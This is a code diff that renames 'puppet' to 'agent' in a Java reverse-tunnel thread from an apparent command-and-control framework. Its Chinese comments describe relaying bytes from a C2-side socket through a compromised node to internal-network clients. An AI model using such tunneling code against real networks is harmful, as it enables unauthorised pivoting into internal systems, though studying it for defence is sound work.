@@ -1,7 +1,7 @@
 package org.leo.core.engine.reverse;
 
 import org.leo.core.engine.socks5.Socks5ProxyStatistics;
-import org.leo.core.puppet.capability.ComponentInvokeCapable;
+import org.leo.core.agent.capability.ComponentInvokeCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -13,7 +13,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 /**
- * 从 C2 本地 socket（forwardHost:forwardPort）读 → 通过组件写入 puppet 端。
+ * 从 C2 本地 socket（forwardHost:forwardPort）读 → 通过组件写入 agent 端。
  * 即"C2 侧目标服务返回的字节"流向"傀儡 accept 到的内网客户端"。
  */
 class ReverseWriteThread implements Runnable {
@@ -31,7 +31,7 @@ class ReverseWriteThread implements Runnable {
     }
 
     public void run() {
-        ComponentInvokeCapable puppet = server.getPuppetNode();
+        ComponentInvokeCapable agent = server.getAgentNode();
         Socks5ProxyStatistics stats = server.getStatistics();
         byte[] buffer = new byte[65535];
         while (server.isRunning()) {
@@ -53,10 +53,10 @@ class ReverseWriteThread implements Runnable {
                 params.put("op", Integer.valueOf(ReverseTunnelServer.OP_WRITE));
                 params.put("connId", connId);
                 params.put("data", data);
-                Map<String, Object> res = puppet.invokeComponent("ReverseTunnelComponent", params);
+                Map<String, Object> res = agent.invokeComponent("ReverseTunnelComponent", params);
                 Object code = res != null ? res.get("code") : null;
                 if (Integer.valueOf(404).equals(code)) {
-                    logger.debug("反向隧道 puppet 侧连接关闭(write): connId={}", connId);
+                    logger.debug("反向隧道 agent 侧连接关闭(write): connId={}", connId);
                     break;
                 }
             } catch (SocketTimeoutException e) {
@@ -77,7 +77,7 @@ class ReverseWriteThread implements Runnable {
             Map<String, Object> params = new HashMap<String, Object>();
             params.put("op", Integer.valueOf(ReverseTunnelServer.OP_CLOSE));
             params.put("connId", connId);
-            server.getPuppetNode().invokeComponent("ReverseTunnelComponent", params);
+            server.getAgentNode().invokeComponent("ReverseTunnelComponent", params);
         } catch (Exception ignored) {}
     }
 }
